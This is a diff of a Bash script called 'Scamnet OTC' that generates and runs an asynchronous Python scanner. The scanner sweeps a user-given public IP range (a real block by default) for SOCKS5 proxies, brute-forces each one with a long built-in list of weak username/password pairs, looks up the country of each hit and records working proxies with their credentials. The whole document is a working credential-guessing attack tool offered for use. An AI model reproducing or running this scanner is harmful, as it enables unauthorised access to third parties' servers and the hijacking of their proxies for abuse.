@@ -2,15 +2,12 @@
 # main.sh - Scamnet OTC v4.1（终极版：变量独立 + 无依赖 + 永不崩溃）
 set -euo pipefail
 IFS=$'\n\t'
-
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; NC='\033[0m'
 LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LATEST_LOG="$LOG_DIR/latest.log"
 RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
-
 echo -e "${GREEN}[OTC] Scamnet v4.1 (终极独立版 + 永不崩溃)${NC}"
 echo "日志 → $LATEST_LOG"
-
 # ==================== 依赖安装 ====================
 install_deps() {
     echo -e "${YELLOW}[*] 安装依赖...${NC}"
@@ -19,11 +16,9 @@ install_deps() {
     touch .deps_installed
     echo -e "${GREEN}[+] 依赖完成${NC}"
 }
-
 if [ ! -f ".deps_installed" ]; then
     install_deps
 fi
-
 # ==================== 输入 ====================
 DEFAULT_START="157.254.32.0"
 DEFAULT_END="157.254.52.255"
@@ -33,7 +28,6 @@ START_IP=${START_IP:-$DEFAULT_START}
 echo -e "${YELLOW}请输入结束 IP（默认: $DEFAULT_END）:${NC}"
 read -r END_IP || exit 1
 END_IP=${END_IP:-$DEFAULT_END}
-
 if ! [[ $START_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || ! [[ $END_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
     echo -e "${RED}[!] IP 错误！${NC}"; exit 1
 fi
@@ -41,34 +35,29 @@ if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP
     echo -e "${RED}[!] 起始 IP 必须 ≤ 结束 IP！${NC}"; exit 1
 fi
 echo -e "${GREEN}[*] 扫描范围: $START_IP - $END_IP${NC}"
-
 echo -e "${YELLOW}请输入端口（默认: 1080）:${NC}"
 echo " 支持格式：1080 / 1080 8080 / 1-65535"
 read -r PORT_INPUT || exit 1
 PORT_INPUT=${PORT_INPUT:-1080}
-
 PORTS_CONFIG=""
 if [[ $PORT_INPUT =~ ^[0-9]+-[0-9]+$ ]]; then
     PORTS_CONFIG="range: \"$PORT_INPUT\""
 elif [[ $PORT_INPUT =~ ^[0-9]+( [0-9]+)*$ ]]; then
-    PORT_LIST=$(echo "$PORT_INPUT" | tr ' ' ',' | sed 's/,/','/g' | sed 's/,/","/g')
+    PORT_LIST=$(echo "$PORT_INPUT" | tr ' ' ',' | sed 's/,/","/g')
     PORTS_CONFIG="ports: [\"$PORT_LIST\"]"
 else
     PORTS_CONFIG="ports: [$PORT_INPUT]"
 fi
 echo -e "${GREEN}[*] 端口: $PORT_INPUT → $PORTS_CONFIG${NC}"
-
 # ==================== 生成完全独立脚本（v5.1）===================
 cat > "$RUN_SCRIPT" << EOF
 #!/bin/bash
 set -euo pipefail
 cd "\$(dirname "\$0")"
-
 # === 变量重新定义（完全独立）===
 START_IP="$START_IP"
 END_IP="$END_IP"
-PORTS_CONFIG='$PORTS_CONFIG'
-
+PORTS_CONFIG="$PORTS_CONFIG"
 # === 写入 config.yaml ===
 cat > config.yaml << CONFIG
 input_range: "\$START_IP-\$END_IP"
@@ -77,7 +66,6 @@ timeout: 5.0
 max_concurrent: 200
 batch_size: 300
 CONFIG
-
 # === scanner_batch.py（独立运行）===
 cat > scanner_batch.py << 'PY'
 #!/usr/bin/env python3
@@ -87,13 +75,11 @@ import ipaddress
 import yaml
 import sys
 from tqdm import tqdm
-
 # 读取批次
 if len(sys.argv) != 3:
     print("Usage: scanner_batch.py <start> <end>")
     sys.exit(1)
 start_idx, end_idx = int(sys.argv[1]), int(sys.argv[2])
-
 # 加载配置
 with open('config.yaml') as f:
     cfg = yaml.safe_load(f)
@@ -101,23 +87,19 @@ input_range = cfg['input_range']
 raw_ports = cfg.get('ports', cfg.get('range'))
 timeout = cfg.get('timeout', 5.0)
 max_concurrent = cfg.get('max_concurrent', 200)
-
 # 解析
 def parse_ip_range(s):
     a, b = s.split('-')
     return [str(ipaddress.IPv4Address(i)) for i in range(int(ipaddress.IPv4Address(a)), int(ipaddress.IPv4Address(b)) + 1)]
-
 def parse_ports(p):
     if isinstance(p, str) and '-' in p:
         a, b = map(int, p.split('-'))
         return list(range(a, b + 1))
     return [int(x) for x in p] if isinstance(p, list) else [int(p)]
-
 ips = parse_ip_range(input_range)
 ports = parse_ports(raw_ports)
 all_tasks = [(ip, port) for ip in ips for port in ports]
 batch = all_tasks[start_idx:end_idx]
-
 WEAK_PAIRS = [# === 原始列表 ===
     ("123","123"),("admin","admin"),("root","root"),("user","user"),("proxy","proxy"),("111","111"),("1","1"),("qwe123","qwe123"),
     ("abc","abc"),("aaa","aaa"),("1234","1234"),("socks5","socks5"),("123456","123456"),("12345678","12345678"),("admin123","admin"),
@@ -185,7 +167,6 @@ WEAK_PAIRS = [# === 原始列表 ===
     ("x","x"),("xx","xx"),("xxx","xxx"),("xxxx","xxxx"),("xxxxx","xxxxx"),("xxxxxx","xxxxxx"),
     ("y","y"),("yy","yy"),("yyy","yyy"),("yyyy","yyyy"),("yyyyy","yyyyy"),("yyyyyy","yyyyyy"),
     ("z","z"),("zz","zz"),("zzz","zzz"),("zzzz","zzzz"),("zzzzz","zzzzz"),("zzzzzz","zzzzzz")]
-
 async def get_country(ip, session):
     for url in [f"http://ip-api.com/json/{ip}?fields=countryCode", f"https://ipinfo.io/{ip}/country"]:
         try:
@@ -195,7 +176,6 @@ async def get_country(ip, session):
                     if len(code) == 2: return code
         except: pass
     return "XX"
-
 async def test_socks5(ip, port, session, auth=None):
     proxy_auth = aiohttp.BasicAuth(*auth) if auth else None
     try:
@@ -203,7 +183,6 @@ async def test_socks5(ip, port, session, auth=None):
             return True, round(r.extra.get("time_total", 0) * 1000), (await r.text()).strip()
     except:
         return False, 0, None
-
 async def scan(ip, port):
     connector = aiohttp.TCPConnector(limit=10, ssl=False, force_close=True)
     async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=timeout)) as session:
@@ -219,7 +198,6 @@ async def scan(ip, port):
             with open("socks5_valid.txt", "a", encoding="utf-8") as f:
                 f.write(fmt + "\n")
             print(f"[+] 发现: {fmt}")
-
 async def main():
     semaphore = asyncio.Semaphore(max_concurrent)
     async def _scan(ip, port):
@@ -228,13 +206,10 @@ async def main():
     tasks = [_scan(ip, port) for ip, port in batch]
     for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="批次", unit="conn"):
         await f
-
 if __name__ == "__main__":
     asyncio.run(main())
 PY
-
 chmod +x scanner_batch.py
-
 # === 计算总任务数 ===
 TOTAL=\$(
   python3 -c "
@@ -254,26 +229,20 @@ print(int(ips) * ports)
   "
 )
 BATCH_SIZE=\$(yq e '.batch_size' config.yaml 2>/dev/null || echo 300)
-
 echo "[*] 总任务: \$TOTAL, 分批: \$BATCH_SIZE"
-
 > socks5_valid.txt
 > result_detail.txt
 echo "# Scamnet v5.1" > result_detail.txt
 echo "# socks5://..." > socks5_valid.txt
-
 for ((i=0; i<TOTAL; i+=BATCH_SIZE)); do
     end=\$((i + BATCH_SIZE))
     [ \$end -gt \$TOTAL ] && end=\$TOTAL
     echo "[*] 扫描批次 \$i - \$end"
     python3 scanner_batch.py \$i \$end
 done
-
 echo "[+] 扫描完成！结果 → socks5_valid.txt"
 EOF
-
 chmod +x "$RUN_SCRIPT"
-
 # ==================== 启动后台 ====================
 echo -e "${GREEN}[*] 启动后台扫描...${NC}"
 echo " 查看进度: tail -f $LATEST_LOG"
